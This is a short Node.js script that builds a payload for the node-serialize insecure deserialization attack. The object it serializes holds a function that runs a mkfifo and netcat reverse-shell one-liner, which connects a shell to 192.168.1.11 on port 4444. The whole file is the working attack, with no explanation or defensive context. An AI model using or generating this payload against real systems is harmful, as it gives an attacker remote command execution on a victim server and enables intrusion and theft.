var serialize = require('node-serialize');


x = {
test : function(){
  require('child_process').execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.11 4444 >/tmp/f", function puts(error, stdout, stderr) {});
}
};

console.log("Serialized: \n" + serialize.serialize(x));
